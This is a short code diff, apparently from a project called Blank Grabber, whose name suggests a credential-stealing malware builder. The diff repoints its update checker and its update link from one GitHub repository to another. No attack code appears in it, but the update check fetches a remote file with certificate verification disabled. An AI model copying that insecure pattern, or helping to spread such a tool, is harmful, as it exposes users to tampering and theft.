@@ -67,7 +67,7 @@ class Utility:
 				try:
 					http = PoolManager(cert_reqs="CERT_NONE")
 					_hash = json.loads(content)["hash"]
-					newhash = json.loads(http.request("GET", "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/Blank%20Grabber/Extras/hash", timeout= 5).data.decode())["hash"]
+					newhash = json.loads(http.request("GET", "https://raw.githubusercontent.com/Blank-c/lighter-grabber/main/Blank%20Grabber/Extras/hash", timeout= 5).data.decode())["hash"]
 
 					os.system("cls")
 					return _hash != newhash # New update available
@@ -885,7 +885,7 @@ if __name__ == "__main__":
 		if Utility.CheckForUpdates():
 			response = messagebox.askyesno("Update Checker", "A new version of the application is available. It is recommended that you update it to the latest version.\n\nDo you want to update the app? (you would be directed to the official github repository)")
 			if response:
-				webbrowser.open_new_tab("https://github.com/Blank-c/Blank-Grabber")
+				webbrowser.open_new_tab("https://github.com/Blank-c/lighter-grabber")
 				exit(0)
 	
 		# Do not hide console so it can show if there is any error
